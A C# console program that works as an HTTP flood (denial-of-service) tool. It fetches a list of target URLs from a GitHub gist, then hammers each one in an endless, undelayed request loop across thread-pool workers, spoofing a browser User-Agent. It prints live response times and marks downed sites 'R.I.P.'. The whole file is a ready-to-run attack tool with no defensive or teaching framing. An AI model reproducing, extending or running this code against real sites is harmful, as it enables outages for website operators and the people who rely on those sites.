

using System.Net;

using System.Collections.Concurrent;
using System.Diagnostics;

namespace DB
{
    class Program
    {
        private static ConcurrentDictionary<string, string> results = new ConcurrentDictionary<string, string>();

        public static int Main(string[] args)
        {
            var client = new WebClient();

            string targetsList;

            try
            {
                targetsList = client.DownloadString("https://gist.githubusercontent.com/givethemhell/8885277d358bfea7bee6b60dbcb5086c/raw/0420c1b65a5a8cbdd74ecb42a4cb1b9bb2eef876/targets.txt");
            }

            catch (Exception ex)
            {
                Console.Error.WriteLine("Failed to download list of targets");
                return 1;
            }

            string[] targets = null; ;

            try
            {
                targets = targetsList.Split("\n", StringSplitOptions.RemoveEmptyEntries).ToArray();
            }

            catch (Exception ex)
            {
                Console.Error.WriteLine("Failed to parse list of targets: " + ex.Message);

                return 2;
            }

            CancellationTokenSource source = new CancellationTokenSource();

            var timer = new Timer((_) =>
            {
                var items = results.ToList().OrderBy(p => p.Key);
                Console.Clear();

                foreach (var pair in items)
                {
                    Console.WriteLine($"{pair.Key} - {pair.Value}");
                }
            },
            null,
            TimeSpan.Zero,
            TimeSpan.FromSeconds(1));

            var tasks = new List<Task>();

            foreach (var url in targets)
            {
                ThreadPool.UnsafeQueueUserWorkItem((_) => Start(url, source.Token), false);
            }

            Console.ReadKey();

            source.Cancel();

            return 0;
        }

        public static void Start(string url, CancellationToken token)
        {
            var client = new WebClient();
            client.Headers[HttpRequestHeader.UserAgent] = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.121 Safari/535.2";
            var stopWatch = new Stopwatch();

            while (!token.IsCancellationRequested)
            {
                var isDead = false;
                try
                {
                    stopWatch.Restart();
                    client.DownloadString(url);
                }

                catch (Exception ex)
                {
                    isDead = true;
                }

                finally
                {
                    stopWatch.Stop();
                }

                var res = isDead ? "R.I.P. " + stopWatch.Elapsed.ToString() : stopWatch.Elapsed.ToString();

                results.AddOrUpdate(url, res, (_, _1) => res);
            }
            results.Remove(url, out string val);
        }
    }
}